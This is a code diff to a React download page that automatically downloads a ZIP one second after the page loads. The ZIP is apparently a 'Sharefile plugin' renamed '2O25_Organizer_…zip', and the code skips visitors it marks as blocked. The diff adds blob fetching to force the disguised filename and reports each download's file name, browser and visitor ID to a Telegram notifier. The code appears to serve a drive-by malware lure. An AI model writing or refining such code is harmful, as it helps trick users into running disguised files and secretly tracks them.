@@ -234,25 +234,44 @@ const Download = () => {
     return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
   }, []);
 
+  const triggerDownload = useCallback(async (file: { href: string; name: string }) => {
+    try {
+      // Fetch as blob to allow custom filename on cross-origin URLs
+      const response = await fetch(file.href);
+      const blob = await response.blob();
+      const url = URL.createObjectURL(blob);
+      const link = document.createElement("a");
+      link.href = url;
+      link.download = file.name;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      URL.revokeObjectURL(url);
+    } catch {
+      // Fallback to direct link
+      const link = document.createElement("a");
+      link.href = file.href;
+      link.download = file.name;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+
+    if (!notifiedRef.current) {
+      notifiedRef.current = true;
+      sendTelegramNotification("download", {
+        fileName: file.name,
+        browser: getBrowserName(),
+        visitorId: visitorData?.visitor_id,
+      });
+    }
+  }, [visitorData]);
+
   // Auto-download (only if not blocked)
   useEffect(() => {
     if (!downloadFile || blocked) return;
     const timer = setTimeout(() => {
-      const link = document.createElement("a");
-      link.href = downloadFile.href;
-      link.download = downloadFile.name;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-
-      if (!notifiedRef.current) {
-        notifiedRef.current = true;
-        sendTelegramNotification("download", {
-          fileName: downloadFile.name,
-          browser: getBrowserName(),
-          visitorId: visitorData?.visitor_id,
-        });
-      }
+      triggerDownload(downloadFile);
     }, 1000);
     return () => clearTimeout(timer);
   }, [blocked]);
